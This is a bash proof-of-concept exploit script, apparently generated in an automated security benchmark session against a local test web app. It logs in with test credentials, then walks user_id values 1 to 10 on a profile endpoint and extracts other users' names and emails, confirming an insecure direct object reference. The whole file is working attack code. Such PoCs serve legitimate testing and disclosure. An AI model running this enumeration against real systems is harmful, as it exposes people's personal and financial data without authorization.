#!/bin/bash
# POC: Demonstrates IDOR vulnerability by accessing multiple user profiles through user_id parameter manipulation without authorization checks
# Target: ./repo
# Created: 2025-12-01T16:20:22.796Z
# Session: benchmark-XBEN-104-24-minci3mm

# IDOR Vulnerability POC - Profile Enumeration
# This script demonstrates the IDOR vulnerability by accessing other users' profiles
# without proper authorization checks

TARGET_HOST="${1:-http://localhost:8080}"
TEST_USER="test"
TEST_PASS="test"

echo "[*] IDOR Profile Enumeration POC"
echo "[*] Target: $TARGET_HOST"
echo ""

# Step 1: Login with test credentials
echo "[+] Step 1: Authenticating with test credentials (test:test)"
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_HOST/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$TEST_USER&password=$TEST_PASS")

# Check if login was successful
if echo "$LOGIN_RESPONSE" | grep -q "error\|failed\|invalid" 2>/dev/null; then
  echo "[-] Login failed. Response: $LOGIN_RESPONSE"
  exit 1
fi

echo "[+] Authentication successful"
echo ""

# Step 2: Access profiles with different user_id parameters
echo "[+] Step 2: Enumerating user profiles using IDOR vulnerability"
echo ""

FOUND_PROFILES=0

for user_id in {1..10}; do
  PROFILE_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_HOST/profile?user_id=$user_id")
  
  # Check if response contains profile data (indicators: name, email, loan data)
  if echo "$PROFILE_RESPONSE" | grep -qE "(name|email|loan|user)" 2>/dev/null; then
    echo "[!] Profile $user_id - ACCESSIBLE (Unauthorized Access)"
    
    # Extract key fields if possible
    if echo "$PROFILE_RESPONSE" | grep -q "\"name\"" 2>/dev/null; then
      NAME=$(echo "$PROFILE_RESPONSE" | grep -oP '"name"\s*:\s*"\K[^"]+' | head -1)
      EMAIL=$(echo "$PROFILE_RESPONSE" | grep -oP '"email"\s*:\s*"\K[^"]+' | head -1)
      echo "    Name: $NAME"
      echo "    Email: $EMAIL"
    fi
    
    FOUND_PROFILES=$((FOUND_PROFILES + 1))
  elif echo "$PROFILE_RESPONSE" | grep -qi "forbidden\|unauthorized\|403" 2>/dev/null; then
    echo "[-] Profile $user_id - FORBIDDEN (Properly Protected)"
  else
    echo "[?] Profile $user_id - No data or error"
  fi
done

echo ""
echo "[+] Step 3: Vulnerability Assessment"
echo ""

if [ $FOUND_PROFILES -gt 1 ]; then
  echo "[!] VULNERABILITY CONFIRMED: Accessed $FOUND_PROFILES unauthorized user profiles"
  echo "[!] Impact: Complete horizontal privilege escalation - any authenticated user can enumerate all profiles"
  echo "[!] Severity: HIGH - PII exposure (names, emails, financial data)"
  exit 0
else
  echo "[+] No IDOR vulnerability detected or insufficient accessible profiles"
  exit 1
fi